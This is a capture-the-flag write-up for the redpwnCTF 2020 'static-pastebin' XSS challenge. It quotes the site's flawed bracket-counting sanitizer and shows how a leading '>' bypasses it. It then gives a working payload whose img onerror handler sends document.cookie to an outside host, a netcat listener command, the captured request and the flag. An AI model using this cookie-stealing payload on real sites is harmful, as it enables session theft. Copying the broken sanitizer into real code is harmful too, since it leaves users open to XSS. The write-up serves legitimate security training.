# static-pastebin

Author: [roerohan](https://github.com/roerohan)

This challenge uses XSS to get the flag from the `admin bot's` cookies.

# Requirements

- Basic Knowledge of XSS.
- A web server where you can accept a request.

# Source

- https://static-pastebin.2020.redpwnc.tf/

# Exploitation

First, try a random `<h1>Hello</h1>` tag to see if you can put HTML in your pastebin. You can see the `js` file in the page:

```javascript
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.getElementById('paste').innerHTML = clean(input);
}

function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```

We can infer 2 things from this.

- The content of the page is obtained from the URL, which is a base64 encoded form of the text you entered.
- The `clean` function will not allow writing of text if bracket pairs do not match.

It is rather easy to break this clean function, by adding an extra `>` at the starting of your XSS script. Here's the payload:

```
><img src=1 href=1 onerror="javascript:document.location='http://ip:port?cookie='+document.cookie"></img>
```

Your payload has the following URL:

```
https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjPTEgaHJlZj0xIG9uZXJyb3I9ImphdmFzY3JpcHQ6ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9pcDpwb3J0P2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSI+PC9pbWc+
```

You can simply set up a `netcat listener` using `nc -l port` on your server, and pass the link to the `Admin Bot` [here](https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin&url=https%3A%2F%2Fstatic-pastebin.2020.redpwnc.tf%2Fpaste%2F%23PjxpbWcgc3JjPTEgaHJlZj0xIG9uZXJyb3I9ImphdmFzY3JpcHQ6ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9jc2l2aXQuY29tOjkwMDE%2FY29va2llPScrZG9jdW1lbnQuY29va2llIj48L2ltZz4%3D&message=The%20admin%20has%20visited%20your%20URL.). The admin bot is basically a headless chrome browser which has the flag in it's cookies. When it visits your site, the XSS steals the cookies from the admin bot and sends it to your server. You get a request which looks like:

```
GET /?cookie=flag=flag{54n1t1z4t10n_k1nd4_h4rd} HTTP/1.1
Host: ip:port
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
```

The flag is:

```
flag{54n1t1z4t10n_k1nd4_h4rd}
```